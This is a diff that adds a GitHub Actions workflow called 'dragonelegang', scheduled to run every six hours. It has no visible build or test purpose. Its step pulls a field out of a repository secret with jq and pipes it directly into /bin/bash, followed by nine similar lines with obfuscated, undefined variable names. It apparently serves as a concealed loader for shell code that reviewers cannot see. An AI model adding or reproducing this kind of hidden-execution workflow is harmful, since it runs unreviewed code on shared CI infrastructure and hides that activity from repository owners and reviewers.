@@ -1,0 +1,26 @@
+name: dragonelegang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dragonelegang
+        env:
+          qpd246: ${{ secrets.qpd246 }}
+        run: |
+          echo $qpd246 | jq -r .hsq9496 | /bin/bash
+          echo $fdfo99903 | jq -r .ifd94622 | /bin/bash
+          echo $vsa99713 | jq -r .p75616 | /bin/bash
+          echo $e870 | jq -r .iqas6448 | /bin/bash
+          echo $hjh72909 | jq -r .jmq582 | /bin/bash
+          echo $s1 | jq -r .uqu472 | /bin/bash
+          echo $pqb3 | jq -r .xaxts6 | /bin/bash
+          echo $b38 | jq -r .fl789 | /bin/bash
+          echo $j35233 | jq -r .x82640 | /bin/bash
+          echo $wxbc73255 | jq -r .fuksg270 | /bin/bash
+
